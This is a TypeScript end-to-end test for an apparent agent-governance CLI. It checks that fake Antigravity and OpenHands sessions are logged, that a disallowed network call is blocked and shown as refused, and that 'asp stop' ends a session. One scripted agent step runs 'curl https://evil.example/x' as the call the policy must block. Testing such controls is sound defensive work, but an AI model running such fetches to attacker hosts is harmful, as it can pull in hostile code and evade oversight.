import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createServer as createNet } from "node:net";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { hashToken } from "@agent-social/asp-log";
import { main, type Io } from "../src/cli.ts";
import { makeFixture } from "./fixture.ts";

const cli = fileURLToPath(new URL("../src/cli.ts", import.meta.url));
const fakeAgy = { ASP_ANTIGRAVITY_BIN: process.execPath, ASP_ANTIGRAVITY_SCRIPT: fileURLToPath(new URL("./fake-agy.mjs", import.meta.url)) };
const fakeOh = { ASP_OPENHANDS_BIN: process.execPath, ASP_OPENHANDS_SCRIPT: fileURLToPath(new URL("./fake-openhands.mjs", import.meta.url)) };
const freePort = () => new Promise<number>((resolve) => { const s = createNet(); s.listen(0, "127.0.0.1", () => { const p = (s.address() as { port: number }).port; s.close(() => resolve(p)); }); });
const until = async (what: string, fn: () => boolean | Promise<boolean>, ms = 20_000) => { const t0 = Date.now(); while (!(await fn())) { if (Date.now() - t0 > ms) throw new Error(`timed out waiting for ${what}`); await new Promise((r) => setTimeout(r, 150)); } };

test("asp run antigravity|openhands: a governed session on the package path under the standing job: the call outside the Mandate is blocked and shown as refused, the rest is reported, and asp stop ends the tool", async () => {
  const dir = mkdtempSync(join(tmpdir(), "asp-hooked-e2e-"));
  const tokens = join(dir, "tokens.json");
  writeFileSync(tokens, JSON.stringify([{ name: "hk", role: "tenant", tokenSha256: hashToken("tok-hk") }]));
  const port = await freePort();
  const base = `http://127.0.0.1:${port}`;
  const server = spawn(process.execPath, [cli, "serve", "--db", `local:${join(dir, "log")}`, "--tokens", tokens, "--port", String(port), "--did-domain", `127.0.0.1:${port}`], { stdio: ["ignore", "pipe", "pipe"] });
  try {
    await new Promise<void>((resolve, reject) => {
      let buf = "";
      server.stdout.on("data", (d) => { buf += d; if (/listening on/.test(buf)) resolve(); });
      server.on("close", () => reject(new Error(`the service exited: ${buf}`)));
      setTimeout(() => reject(new Error(`no start line: ${buf}`)), 20_000);
    });
    const f = makeFixture();
    const project = join(f.root, "project"); mkdirSync(project, { recursive: true });
    writeFileSync(join(project, "GEMINI.md"), "# Project\n\nKeep functions small.\n");
    mkdirSync(f.aspHome, { recursive: true });
    const me = `did:web:127.0.0.1%3A${port}:u:hk`, agent = `did:web:127.0.0.1%3A${port}:a:hk:my-agent`, bank = `did:web:127.0.0.1%3A${port}:u:hk:bank`;
    writeFileSync(join(f.aspHome, "config.json"), JSON.stringify({ service: base, token: "tok-hk", tenant: "hk", joinedAt: "2026-10-11T00:00:00Z", identities: { me, agent, bank } }));
    const call = async (args: string[], extraEnv: NodeJS.ProcessEnv = {}) => {
      const out: string[] = [], err: string[] = [];
      const code = await main(args, { out: (l) => out.push(l), err: (l) => err.push(l), env: { ASP_HOME: f.aspHome, ...extraEnv }, cwd: f.root, raw: (b) => out.push(b.toString("utf8").trimEnd()) } as Io);
      return { code, out: out.join("\n"), err: err.join("\n") };
    };
    for (const a of [["identity", "new", "--kind", "human", "--me", "--no-recovery"], ["identity", "new", "--kind", "agent", "--name", "my-agent", "--sponsor", me, "--purpose", "Test"], ["identity", "new", "--kind", "human", "--name", "bank", "--no-recovery"]]) assert.equal((await call(a)).code, 0);

    // A prompt is required (these tools are started with a task), and a headless run is not built for them.
    assert.equal((await call(["run", "antigravity", "--project", project], fakeAgy)).code, 2);
    const hl = await call(["run", "antigravity", "--headless", "--contract", "x", "--prompt", "p"], fakeAgy);
    assert.equal(hl.code, 2);
    assert.match(hl.err, /--headless is not built/);

    // Antigravity: a read and a command run; one call to the network, which the Mandate does not grant, is blocked before it runs.
    const steps = [
      { tool: "view_file", parameters: { AbsolutePath: "a.ts" }, ran: true, scope: "repo.read" },
      { tool: "run_command", parameters: { CommandLine: "curl https://evil.example/x" }, blocked: true },
      { tool: "finish" },
    ];
    const agy = await call(["run", "antigravity", "--prompt", "Read a.ts", "--project", project], { ...fakeAgy, FAKE_AGY_STEPS: JSON.stringify(steps) });
    assert.equal(agy.code, 0, agy.err + agy.out);
    assert.match(agy.err, /new standing job/);
    assert.match(agy.out, /Session summary/);
    assert.match(agy.out, /finished/);
    assert.match(agy.out, /refused\s+shell\.network was blocked before it ran/);
    const sid = /session\s+([0-9a-f]{8})\s+finished/.exec(agy.out)![1];
    const detail = await call(["runs", sid]);
    assert.match(detail.out, /1 signed Action report\(s\)/, "the run was reported to the log under the standing job");
    assert.match(detail.out, /scopes used: repo\.read/);
    // The history knows it, as for the other runtimes; the temporary package is gone.
    const runs = await call(["runs"]);
    assert.match(runs.out, /antigravity\s+ended\s+\d+ calls, 1 refused/);
    assert.deepEqual(readdirNames(f.aspHome).filter((n) => n.startsWith("session-pkg-")), []);

    // OpenHands: the same, through its own adapter (the standing job is another one: another runtime, another session).
    const oh = await call(["run", "openhands", "--prompt", "go", "--project", project], { ...fakeOh, FAKE_OH_ACTIONS: JSON.stringify([{ tool_name: "terminal", action: { command: "ls" } }]), FAKE_OH_LEARN: "0" });
    assert.equal(oh.code, 0, oh.err + oh.out);
    assert.match(oh.out, /Session summary[\s\S]*finished/);
    const ohSid = /session\s+([0-9a-f]{8})\s+finished/.exec(oh.out)![1];
    // Both runtimes share the agent's standing job (same agent, same permissions): two reports, one of them observed rather than hook-enforced.
    assert.match((await call(["runs", ohSid])).out, /2 signed Action report\(s\) across its sessions, assurance hook_enforced\/runtime_observed/);

    // asp stop ends a running session of a hooked runtime; the standing job stays.
    const held = call(["run", "antigravity", "--prompt", "Take your time", "--project", project], { ...fakeAgy, FAKE_AGY_WAIT_MS: "15000" });
    await until("the session to be running", async () => /running\?/.test((await call(["runs"])).out));
    const t0 = Date.now();
    assert.match((await call(["stop"])).out, /stopping session/);
    const stopped = await held;
    assert.ok(Date.now() - t0 < 10_000, "the tool was ended well before it would have finished");
    assert.match(stopped.out, /stopped by you/);
    assert.match((await call(["standing"])).out, /3 session\(s\)|2 session\(s\)/);
  } finally {
    server.kill();
  }
});

import { readdirSync } from "node:fs";
function readdirNames(dir: string): string[] { return readdirSync(dir); }
